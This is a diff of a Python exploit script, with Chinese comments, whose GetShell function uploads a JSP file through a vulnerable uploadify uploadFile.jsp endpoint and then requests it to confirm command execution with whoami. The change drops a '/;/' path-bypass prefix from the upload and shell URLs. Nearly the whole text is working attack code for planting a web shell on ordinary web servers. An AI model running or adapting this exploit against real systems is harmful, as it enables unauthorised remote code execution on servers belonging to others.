@@ -7,7 +7,7 @@ urllib3.disable_warnings()
 #本脚本只上传执行了whoami命令的文件
 
 def GetShell(urllist):
-    url = urllist+"/;/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/"
+    url = urllist+"/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/"
     flag ='whoami'
     proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
     headers = {"Accept": "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8",
@@ -21,7 +21,7 @@ def GetShell(urllist):
         res=requests.post(url, headers=headers, data=data,verify=False,timeout=30)
         res=re.search(r'(.*?).jsp', res.text, re.S).group(0)
         if '.jsp' in res:
-            listshell = urllist + "/;/plugins/uploadify/" + res
+            listshell = urllist + "/plugins/uploadify/" + res
             print(urllist + " 测试文件上传成功。"+"\n"+"地址为：" + listshell)
             res2=requests.get(url=listshell, verify=False, timeout=30)
             res2=res2.text.replace("\n","")
